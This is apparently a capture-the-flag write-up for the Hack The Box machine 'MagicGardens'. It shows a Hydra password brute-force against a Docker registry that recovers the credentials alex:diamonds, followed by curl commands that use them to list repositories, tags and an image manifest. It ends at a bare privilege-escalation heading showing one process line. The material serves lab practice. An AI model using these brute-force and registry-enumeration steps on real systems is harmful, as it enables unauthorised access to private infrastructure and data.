
# Bruteforcing Docker
```sh
└─$ curl -k https://10.10.11.9:5000/v2/                                        
{"errors":[{"code":"UNAUTHORIZED","message":"authentication required","detail":null}]}
```
```sh
hydra -l alex -P /usr/share/wordlists/rockyou.txt https-get://10.10.11.9:5000/v2/ -s 5000 -f    
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-25 02:30:22
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-gets://10.10.11.9:5000/v2/
[5000][http-get] host: 10.10.11.9   login: alex   password: diamonds
[STATUS] attack finished for 10.10.11.9 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-05-25 02:30:51

```

# Enumeration of Docker Registry
```sh
└─$ curl -u alex:diamonds -k https://10.10.11.9:5000/v2/_catalog

{"repositories":["magicgardens.htb"]}
                                                                                                                                                  
┌──(kali㉿kali)-[~/Desktop/HTB_Machines/MagicGardens/DockerRegistryGrabber]
└─$ curl -u alex:diamonds -k https://10.10.11.9:5000/v2/magicgardens.htb/tags/list

{"name":"magicgardens.htb","tags":["1.3"]}
                                                                                                                                                  
┌──(kali㉿kali)-[~/Desktop/HTB_Machines/MagicGardens/DockerRegistryGrabber]
└─$ curl -u alex:diamonds -k -H "Accept: application/vnd.docker.distribution.manifest.v2+json" https://10.10.11.9:5000/v2/magicgardens.htb/manifests/1.3

{
   "schemaVersion": 2,
   "mediaType": "application/vnd.docker.distribution.manifest.v2+json",
   "config": {
      "mediaType": "application/vnd.docker.container.image.v1+json",
      "size": 11343,
      "digest": "sha256:fc282e273a79fd427d942900963c4fca756b5f3553eed525a2eb88579aac48f2"
   },
   "layers": [
      {
         "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
         "size": 49557399,
         "digest": "sha256:de4cac68b6165c40cf6f8b30417948c31be03a968e233e55ee40221553a5e570"
      },
      {
         "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
         "size": 24030511,
         "digest": "sha256:d31b0195ec5f04dfc78eca9d73b5d223fc36a29f54ee888bc4e0615b5839e692"
      },
      {
         "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
         "size": 64112171,
         "digest": "sha256:9b1fd34c30b75e7edb20c2fd09a9862697f302ef9ae357e521ef3c84d5534e3f"
      },
      {
         "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
         "size": 211031859,
         "digest": "sha256:c485c4ba383179db59368a8a4d2df3e783620647fe0b014331c7fd2bd8526e5b"
      },
      {
         "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
         "size": 6388711,
         "digest": "sha256:9c94b131279a02de1f5c2eb72e9cda9830b128840470843e0761a45d7bebbefe"
      },
      {
         "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
         "size": 19784106,
         "digest": "sha256:4bc8eb4a36a30acad7a56cf0b58b279b14fce7dd6623717f32896ea748774a59"
      },
      {
         "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
         "size": 243,
         "digest": "sha256:470924304c244ba833543bb487c73e232fd34623cdbfa51d30eab30ce802a10d"
      },
      {
         "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
         "size": 3109601,
         "digest": "sha256:8999ec22cbc0ab31d0e3471d591538ff6b2b4c3bbace9c2a97e6c68844382a78"
      },
      {
         "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
         "size": 140,
         "digest": "sha256:02cea9e48b60ccaf6476be25bac7b982d97ef0ed66baeb8b0cffad643ece37d5"
      },
      {
         "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
         "size": 6286807,
         "digest": "sha256:480311b89e2d843d87e76ea44ffbb212643ba89c1e147f0d0ff800b5fe8964fb"
      },
      {
         "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
         "size": 255,
         "digest": "sha256:fedbb0514db0150f2376b0f778e5f304c302b53619b96a08824c50da7e3e97ea"
      },
      {
         "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
         "size": 57638868,
         "digest": "sha256:d66316738a2760996cb59c8eb2b28c8fa10a73ce1d98fb75fda66071a1c659d6"
      },
      {
         "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
         "size": 421,
         "digest": "sha256:f9afd820562f8d93873f4dfed53f9065b928c552cf920e52e804177eff8b2c82"
      },
      {
         "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
         "size": 218,
         "digest": "sha256:437853d7b910e50d0a0a43b077da00948a21289a32e6ce082eb4d44593768eb1"
      },
      {
         "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
         "size": 164,
         "digest": "sha256:35b21a215463f8130302987a1954d01a8346cdd82c861d57eeb3cfb94d6511a8"
      },
      {
         "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
         "size": 322,
         "digest": "sha256:81771b31efb313fb18dae7d8ca3a93c8c4554aa09239e09d61bbbc7ed58d4515"
      },
      {
         "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
         "size": 321,
         "digest": "sha256:748da8c1b87e668267b90ea305e2671b22d046dcfeb189152bf590d594c3b3fc"
      },
      {
         "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
         "size": 6287365,
         "digest": "sha256:b0c11cc482abe59dbeea1133c92720f7a3feca9c837d75fd76936b1c6243938c"
      }
   ]
}                                                                                                                                                  


```

# Priv Esc
```sh
alex        1039  0.0  0.0   2464   872 ?        S    May24   0:00 harvest server -l /home/alex/.harvest_logs

```